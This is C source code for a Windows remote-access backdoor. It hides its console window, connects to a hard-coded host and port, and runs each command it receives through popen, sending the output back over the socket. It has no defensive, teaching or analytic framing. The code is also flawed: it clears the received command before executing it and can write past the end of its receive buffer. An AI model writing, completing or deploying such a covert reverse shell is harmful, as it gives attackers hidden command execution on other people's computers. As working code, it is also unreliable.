#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

int connected = 1;

char parse_command(char inbuf[],int sockd);

int main(int argc,char *argv[]){
	ShowWindow(GetConsoleWindow(),SW_HIDE); // should hide console window
	SOCKET sd;
	struct sockaddr_in sin;
	WSADATA wsaData;
	char rbuf[2048];
	char sbuf[2048];

	char dest_ip[16];
	int dest_port = 80;
	int readsiz;

	if(WSAStartup(MAKEWORD(2,2),&wsaData) != 0){
		exit(1);
	}
	
	if((sd = socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET){
		exit(1);
	}
	strcpy(dest_ip,"127.0.0.1");

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(dest_ip);
	sin.sin_port = htons(dest_port);

	if(connect(sd,(struct sockaddr*)&sin,sizeof(sin)) < 0){
		exit(1);
	}
	strcpy(sbuf,"Hello parent!\n");
	send(sd,sbuf,strlen(sbuf),0);
	memset(rbuf,0,sizeof(sbuf));

	while(connected){
		readsiz = recv(sd,rbuf,sizeof(rbuf),0);
		printf("%s",rbuf);
		if(readsiz <= 0){
			connected = 0;
		}
		rbuf[readsiz] = '\0';
		memset(rbuf,0,sizeof(rbuf));
		memset(sbuf,0,sizeof(sbuf));

		parse_command(rbuf,sd);
	}

	closesocket(sd);
	WSACleanup();

	exit(0);
}

char parse_command(char inbuf[],int sockd){
	FILE *shellcmd;
	char command_str[2048];
	char cmd_output[2048];
	char sendbuf[2048];

	strncpy(command_str,inbuf,strlen(inbuf));

	if((shellcmd = popen(command_str,"r")) == NULL){
		printf("failed");
	}else{
		while(fgets(cmd_output,sizeof(cmd_output),shellcmd) != 0){
			sprintf(sendbuf,"%s",cmd_output);
			printf("sendbuf: %s",sendbuf);
			send(sockd,sendbuf,strlen(sendbuf),0);
			memset(sendbuf,0,sizeof(sendbuf));
		}
	}

	memset(command_str,0,sizeof(command_str));
	memset(sendbuf,0,sizeof(sendbuf));
	pclose(shellcmd);
}
